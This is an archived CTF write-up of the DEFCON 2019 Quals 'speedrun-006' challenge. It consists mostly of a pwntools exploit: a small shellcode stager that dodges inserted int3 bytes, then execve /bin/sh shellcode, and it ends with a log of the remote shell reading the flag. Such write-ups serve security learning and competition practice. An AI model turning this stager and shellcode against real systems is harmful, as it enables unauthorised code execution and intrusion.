# speedrun-006

**CTF:** DEFCON 2019 Quals  
**Category:** misc  
**Original writeup:** <https://ctftime.org/writeup/15306> — by **ctftime.org**. All credit goes to the original author; this is an archived copy.

---

BINARY = './speedrun-006'

elf = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':

HOST = "speedrun-006.quals2019.oooverflow.io"

PORT = 31337

s = remote(HOST, PORT)

else:

s = process(BINARY)

st1 = asm("""

syscall # for rcx = rip

mov dl, 0x20

""")

st2 = asm("""

add cl, 0x20

""")



st3 = asm("""

mov rsi, rcx

syscall

jmp rsi

""")

s.recvuntil("Send me your ride")

# shellcode stager

# \xb3\xcc is "mov bl 0xcc" to avoid int3

buf = st1 + '\xb3' + st2 + '\xb3' + st3

buf += "A" * (25-len(buf))

s.sendline(buf)

sleep(0.1)

# shellcode

sc = asm("""

mov al, 0x3b

mov rdi, rsi

add rdi, 0x11

xor rsi, rsi

xor rdx, rdx

syscall

""")

sc += "/bin/sh\x00"

s.sendline(sc)

s.interactive()

```

```

$ python exploit.py r

[+] Opening connection to speedrun-006.quals2019.oooverflow.io on port 31337: Done

[*] Switching to interactive mode

$ id

uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)

$ cat flag

OOO{Uh, guys I__Think We Need A Change of___plans. They got A pwn!!! I'm sorry. Did somebody say a pwn!?!?!?}
